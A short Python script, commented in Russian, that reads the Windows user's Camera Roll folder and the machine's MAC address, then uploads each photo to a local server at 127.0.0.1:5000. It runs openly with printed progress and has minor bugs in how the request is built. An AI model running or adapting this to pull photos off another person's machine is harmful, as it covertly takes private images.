import os
import re
import uuid
import requests

# Получаем путь к папке Camera Roll
profile_path = os.path.join("C:\\Users", os.getlogin(), "Pictures", "Camera Roll")

# Получаем мак адрес компа
mac = ''.join(re.findall('..', '%012x' % uuid.getnode()))

# URL сервера, который будет принимать фотографии
upload_url = "127.0.0.1:5000"
protocol = 'http'


# Проверяем существование папки
if os.path.exists(profile_path):
	print("Папка Camera Roll существует.")

	# Получаем список файлов в папке
	files = os.listdir(profile_path)

	# Проверяем, есть ли в списке файлов что-то помимо desktop.ini
	if any(file != 'desktop.ini' for file in files):
		print("В папке Camera Roll есть файлы для отправки:")
		for file in files:
			if file != 'desktop.ini':
				fullpath = os.path.join(profile_path, file)
				print(f"Отправляется файл: {file} ({fullpath})")
				json = {'mac_address': mac}
				headers = {'Content-Type': 'application/json'}
				files = {'file': open(fullpath, 'rb')}
				print(files)
				response = requests.post(f'{protocol}://{upload_url}/upload', headers=headers, files=files, json=json)
				print(response.text)
		print("Файлы успешно отправлены.")
	else:
		print("В папке Camera Roll нет файлов.")
else:
	print("Папка Camera Roll не существует.")
